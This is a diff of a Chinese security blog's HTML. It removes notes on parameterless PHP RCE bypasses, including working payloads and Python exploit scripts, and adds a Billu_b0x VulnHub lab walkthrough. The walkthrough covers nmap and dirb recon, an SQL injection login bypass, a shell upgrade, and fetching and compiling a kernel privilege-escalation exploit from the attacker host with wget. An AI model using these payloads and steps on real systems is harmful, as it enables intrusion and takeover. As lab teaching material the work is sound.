@@ -4,11 +4,9 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="无参数RCE和无字母webshell, 沉梦昂志">
-    <meta name="description" content="无参数RCE和无字母webshell看了飘零师傅和p牛的博客做一些笔记
-eval($_GET[&amp;#39;code]&amp;#39;);即可getshell
-如果存在正则限制
-if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?">
+    <meta name="keywords" content="Billu_b0x靶机渗透, 沉梦昂志">
+    <meta name="description" content="Billu_b0x靶机渗透下载链接https://download.vulnhub.com/billu/Billu_b0x.zip
+说明攻击机为kali linux ip 为 192.168.12.145靶机 ip 192.168.12.1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -16,7 +14,7 @@ if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>无参数RCE和无字母webshell | 沉梦昂志</title>
+    <title>Billu_b0x靶机渗透 | 沉梦昂志</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="https://mail.ding0x0.top/font-awesome.min.css">
@@ -200,13 +198,13 @@ if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://mail.ding0x0.top/pic_5.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://mail.ding0x0.top/pic_4.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        无参数RCE和无字母webshell
+                        Billu_b0x靶机渗透
                     </div>
                 </div>
             </div>
@@ -317,8 +315,12 @@ if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/笔记/" target="_blank">
-                                <span class="chip bg-color">笔记</span>
+                            <a href="/tags/渗透测试/" target="_blank">
+                                <span class="chip bg-color">渗透测试</span>
+                            </a>
+                        
+                            <a href="/tags/writeup/" target="_blank">
+                                <span class="chip bg-color">writeup</span>
                             </a>
                         
                     </div>
@@ -329,8 +331,8 @@ if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?">
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/总结/" class="post-category" target="_blank">
-                                总结
+                            <a href="/categories/渗透测试/" class="post-category" target="_blank">
+                                渗透测试
                             </a>
                         
                     </div>
@@ -348,14 +350,14 @@ if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        489
+                        815
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        2 分
+                        3 分
                     </div>
                     
                 
@@ -371,62 +373,49 @@ if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="无参数RCE和无字母webshell"><a href="#无参数RCE和无字母webshell" class="headerlink" title="无参数RCE和无字母webshell"></a>无参数RCE和无字母webshell</h1><p>看了飘零师傅和p牛的博客做一些笔记</p>
-<p><code>eval($_GET[&#39;code]&#39;)</code>;即可getshell</p>
-<p>如果存在正则限制</p>
-<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <h1 id="Billu-b0x靶机渗透"><a href="#Billu-b0x靶机渗透" class="headerlink" title="Billu_b0x靶机渗透"></a>Billu_b0x靶机渗透</h1><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><a href="https://download.vulnhub.com/billu/Billu_b0x.zip" target="_blank" rel="noopener">https://download.vulnhub.com/billu/Billu_b0x.zip</a></p>
+<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>攻击机为<code>kali linux</code> ip 为 <code>192.168.12.145</code><br>靶机 ip <code>192.168.12.165</code></p>
+<h2 id="主机发现和信息搜集"><a href="#主机发现和信息搜集" class="headerlink" title="主机发现和信息搜集"></a>主机发现和信息搜集</h2><p>主机发现</p>
+<pre><code>netdiscover -r 192.168.12.0/24</code></pre><p>发现靶机ip为 <code>192.168.12.165</code></p>
+<p>端口扫描</p>
+<pre><code>nmap -sS -A -Pn -p- -n 192.168.12.165</code></pre><p>发现开放了 22 80端口</p>
+<p>直接用<code>dirb</code>区探测目录</p>
+<pre><code>dirb http://192.168.12.165 /usr/share/wordlists/dirb/big.txt</code></pre><p><img src="https://mail.ding0x0.top/blog/bj/bj_1_1.png" alt="bj_1_1"><br>说下目录利用</p>
+<pre><code>192.168.12.165/index #登录页，说是存在sql注入
+192.168.12.165/in #phpinfo 可以得到网站绝对路径
+192.168.12.165/test #任意文件下载
+192.168.12.165/panel #需要登陆
+192.168.12.165/c #得到mysql配置文件
+192.168.12.165/phpmy/ #phpmyadmin</code></pre><p>可以从<code>c</code>中得到<code>mysql</code>配置，登陆phpmyadmin，在<code>phpinfo</code>找到绝对路径，写入一句话，尝试后失败<br>但是得到了登陆张号和密码可以拿去登陆。</p>
+<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>通过任意文件下载拿到首页源码，构造万能密码登陆。</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$uname</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'un'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$pass</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ps'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$run</span><span class="token operator">=</span><span class="token string">'select * from auth where  pass=\''</span><span class="token punctuation">.</span><span class="token variable">$pass</span><span class="token punctuation">.</span><span class="token string">'\' and uname=\''</span><span class="token punctuation">.</span><span class="token variable">$uname</span><span class="token punctuation">.</span><span class="token string">'\''</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token comment" spellcheck="true">//login</span>
 <span class="token punctuation">}</span></code></pre>
-<p>即只可执行无参数的函数<br>允许</p>
-<pre><code>a(b(c()))
-a()</code></pre><p>不允许<br><code>a(&#39;1&#39;)</code></p>
-<h2 id="绕过方法一"><a href="#绕过方法一" class="headerlink" title="绕过方法一"></a>绕过方法一</h2><p>利用<code>getenv</code>方法</p>
-<ol>
-<li>使用<code>getenv</code>方法可以返回所有的环境变量，等同于$_ENV，是一个数组；</li>
-<li>使用<code>array_rand</code>方法返回数组中随机一个键；</li>
-<li>使用<code>array_flip</code>方法将数组的键值调换，正常返回需要的数值</li>
-<li>爆破，返回所有数据<br>payload <code>?cmd=var_dump(array_rand(array_flip(getenv())));</code></li>
-</ol>
-<h2 id="绕过方法二"><a href="#绕过方法二" class="headerlink" title="绕过方法二"></a>绕过方法二</h2><p>利用<code>getallheaders</code>方法</p>
-<p>使用场景 ，中间件是<code>apache</code></p>
-<ol>
-<li><code>getallheaders</code>方法返回包含当前请求所有头信息的数组；</li>
-<li><code>end</code>方法返回数组最后一条；</li>
-</ol>
-<p>payload <code>?cmd=eval(end(getallheaders()));</code><br><img src="_v_images/20190409205646814_4640.png" alt></p>
-<h2 id="绕过方法三"><a href="#绕过方法三" class="headerlink" title="绕过方法三"></a>绕过方法三</h2><p>使用 <code>get_defined_vars</code>方法</p>
-<p><code>get_defined_vars</code>方法返回<code>$_GET,$_POST,$_COOKIE,$_FILES</code>数组</p>
-<ol>
-<li>使用<code>current</code>方法返回新添加的数据</li>
-<li>同样利用方法二的方式来达到RCE</li>
-</ol>
-<p>碰到禁用了<code>$_GET,$_POST,$_COOKIE</code>时可以使用<code>$_FILES</code>，使用脚本来达到RCE</p>
-<p>exp</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
-
-payload <span class="token operator">=</span> <span class="token string">"system('ls /tmp');"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
-files <span class="token operator">=</span> <span class="token punctuation">{</span>
-  payload<span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span><span class="token string">'hahaha'</span><span class="token punctuation">)</span>
-<span class="token punctuation">}</span>
-
-r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
-
-<span class="token keyword">print</span> r<span class="token punctuation">.</span>content</code></pre>
-<h2 id="绕过方法四"><a href="#绕过方法四" class="headerlink" title="绕过方法四"></a>绕过方法四</h2><p>使用session绕过<br>通过<code>session_id()</code>返回<code>session id</code><br>通过hex编码来写入payload既符合<code>PHPSESSID</code>的规范</p>
-<p>exp</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-url <span class="token operator">=</span> <span class="token string">'http://localhost/test.php?code=eval(hex2bin(session_id(session_start())));'</span>
-payload <span class="token operator">=</span> <span class="token string">"system('ls ./');"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
-cookies <span class="token operator">=</span> <span class="token punctuation">{</span>
-<span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>payload
-<span class="token punctuation">}</span>
-r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
-<span class="token keyword">print</span> r<span class="token punctuation">.</span>content
-</code></pre>
-<h2 id="绕过方法五"><a href="#绕过方法五" class="headerlink" title="绕过方法五"></a>绕过方法五</h2><p>使用<code>dirname()</code> &amp; <code>chdir()</code>直接读取文件</p>
-<p>用到的函数<br><code>getcwd()</code>  获取当前目录<br><code>dirname()</code> 返回路径中的目录部分<br><code>chdir()</code> 改变目录<br><code>scandir()</code> 列出指定路径中的文件和目录<br>这几个函数配合使用即可达到目录遍历效果</p>
-<p>payload<br>遍历当前目录 <code>?code=var_dump(scandir(getcwd()));</code><br>遍历上级目录<code>?code=var_dump(scandir(dirname(getcwd())));</code><br>读取文件 <code>?code=readfile(next(array_reverse(scandir(getcwd()))))</code></p>
+<p>写完后看了很多东西，说是过滤了<code>\&#39;</code>,这东西不是转义符么？实际上的sql语句不应该是这样的么</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$run</span> <span class="token operator">=</span> <span class="token string">"select * from auth where pass = '$pass' and uname = '$uname'"</span><span class="token punctuation">;</span></code></pre>
+<p>然后会把所有的<code>&#39;</code>替换成空，那么构造的万能密码应该是这个意思</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$run</span> <span class="token operator">=</span> <span class="token string">"select * from auth where pass = '-\' and uname = 'or 1=1-- '"</span><span class="token punctuation">;</span></code></pre>
+<p>我的理解是<strong>用\把pass的第二个单引号给转义，所以pass现在是<code>-\&#39; and uname =</code>这一整串，然后跟上or 1=1</strong>构造成万能密码。<br>顺便提下，在sql命令行里查询想要转义<code>&#39;</code>需要用两个<code>\</code>，也是问了别人，以前都没注意过，也没出现过这种情况。<br>然后需要注意的一点是注释符<code>--</code>和被<strong>注释的</strong>的字符中间要有一个空格，或者直接用<code>#</code>。<br>以上仅是个人理解，如果有误，望斧正</p>
+<p>接着登陆后存在一个文件上传和包含，这里很好审出来就不写了，直接跳到反弹回shell。</p>
+<p>拿到后用python返回一个交互shell</p>
+<pre class=" language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'__import__("pty").spawn("/bin/bash")'</span></code></pre>
+<p>查看版本信息</p>
+<pre class=" language-sh"><code class="language-sh">uname -a#Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux</code></pre>
+<p>直接在kali中搜索本地提交脚本</p>
+<pre class=" language-sh"><code class="language-sh">searchsploit linux 3.13.0 | grep local</code></pre>
+<p>cp一份到/tmp目录，打开一个服务器</p>
+<pre class=" language-python"><code class="language-python">python <span class="token operator">-</span>m SimpleHTTPServer <span class="token number">8000</span></code></pre>
+<p>在靶机中cd到/tmp目录下载脚本</p>
+<pre class=" language-sh"><code class="language-sh">wget http://192.168.12.145:8000/37292.c</code></pre>
+<p>用gcc编译</p>
+<pre class=" language-sh"><code class="language-sh">gcc 373292.c -o pwn</code></pre>
+<p>直接执行提权成功。</p>
+<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>在phpmyadmin目录下一般存放这服务器的配置文件，<code>config.inc.php</code>，尝试访问，确实存在，直接下载，得到root账号密码，ssh登陆。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>开始sql注入没能够理解，看了很多篇，试了很多次，都没成功，小细节上就是 <code>--</code>后要有一个空格，其实这种方法在实验吧有一题出现过，后来遇到的少了就没注意过，这是一点，然后是要多关注服务器的配置文件，可能包含很多有用的信息。</p>
 
             </div>
             <hr/>
@@ -585,9 +574,9 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《无参数RCE和无字母webshell》
+                    《Billu_b0x靶机渗透》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/07/11/wu-can-shu-rce-he-wu-zi-mu-webshell/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/07/11/billu-b0x-ba-ji-shen-tou/" property="cc:attributionName"
                rel="cc:attributionURL">
                 ding
             </a> 采用
@@ -627,9 +616,10 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2019/07/11/billu-b0x-ba-ji-shen-tou/">
                     <div class="card-image">
@@ -647,9 +637,9 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-11
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-11
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -662,6 +652,7 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -684,19 +675,19 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/07/11/ssh/">
+                <a href="/2019/07/11/wu-can-shu-rce-he-wu-zi-mu-webshell/">
                     <div class="card-image">
                         
                         
-                        <img src="https://mail.ding0x0.top/pic_4.jpg" class="responsive-img" alt="Linux ssh">
+                        <img src="https://mail.ding0x0.top/pic_5.jpg" class="responsive-img" alt="无参数RCE和无字母webshell">
                         
-                        <span class="card-title">Linux ssh</span>
+                        <span class="card-title">无参数RCE和无字母webshell</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Linux下ssh使用的一点总结
+                            无参数RCE和无字母webshell利用的一点总结
                         
                     </div>
                     <div class="publish-info">
@@ -718,8 +709,8 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Linux/" target="_blank">
-                        <span class="chip bg-color">Linux</span>
+                    <a href="/tags/笔记/" target="_blank">
+                        <span class="chip bg-color">笔记</span>
                     </a>
                     
                 </div>
